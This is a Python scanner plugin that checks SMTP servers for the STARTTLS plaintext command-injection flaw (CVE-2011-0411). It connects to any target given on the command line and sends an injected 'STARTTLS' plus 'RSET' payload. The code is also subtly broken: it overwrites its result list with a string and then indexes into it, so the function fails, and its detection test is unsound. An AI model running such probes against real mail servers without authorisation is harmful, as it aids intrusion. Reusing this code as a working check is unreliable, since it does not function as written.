#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: smtp starttls明文命令注入(CVE-2011-0411)
referer: http://www.securityfocus.com/archive/1/516901/30/0/threaded
author: Lucifer
description: smtp starttls明文命令注入漏洞可以使攻击者通过发送明文命令注入到加密的SMTP会话，此会话经过TLS处理会造成中间人攻击。
'''
import sys
import socket
import warnings

from urllib.parse import urlparse
def run(url):
        result = ['smtp starttls明文命令注入(CVE-2011-0411)', '', '']
        port = 25
        if r"http" in url:
            #提取host
            host = urlparse(url)[1]
            try:
                port = int(host.split(':')[1])
            except:
                pass
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            if url.find(":") >= 0:
                host = url.split(":")[0]
                port = int(url.split(":")[1])
            else:
                host = url

        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(6)
            s.connect((host, port))
            s.recv(1024).decode()
            s.send(b"STARTTLS\r\nRSET\r\n")
            result = s.recv(1024).decode()
            s.close()
            if r"220 Ready to start TLS" in result:
                result[2] = '存在'
                result[1]=host+":"+str(port)
            else:
                result[2] = '不存在'
        except:
            result[2] = '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])

